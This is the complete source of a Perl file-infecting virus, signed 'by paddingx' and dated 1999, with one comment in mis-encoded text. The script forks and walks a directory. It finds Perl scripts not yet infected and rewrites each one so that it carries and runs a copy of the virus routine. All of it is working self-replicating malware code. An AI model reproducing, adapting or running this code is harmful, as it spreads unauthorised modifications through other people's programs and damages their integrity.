#!/usr/bin/perl
use File::Find;
&virus();

# ����� ��ࠦ��� �� 䠩�� � ���७��� .perl ��稭�� � ��४�ਨ /home/chris/test � �����稢�� ��୥� ��᪠

print "\nThis program is infected by the Perl virus\n\n";

sub virus
  {
    my ( $pid, $new );   
    if( $pid = fork ) { return; }
    else
      {
        open( source, $0 );
	finddepth ( \&infect, '/home/chris/test' );
	sub infect 
	  {
            open target, "$File::Find::name";
            $_ = <target>;
	    if ( /(\#!.*perl)/ ) 
	      {
		$_ = <target>;
		if( $_ ne "use File::Find;\n" )
		  {
                    $new = $1 . "\nuse File::Find;\n&virus();\n" . $_;
                    while( <target> ) { $new = $new . $_; }
		    seek(  source, 0, 0 );
                    while( <source> ne "sub virus\n" ) { };
                    $new = $new . "\nsub virus\n";
                    while( <source> ) { $new = $new . $_; }                  
                    close  target;
                    open   target, ">$File::Find::name";
                    print  target $new;
                 }
	      }
	    close( target );   
	  }
        close( source );
	exit( 0 );
      }
  }

# a Perl virus, by paddingx
# 08/15/1999

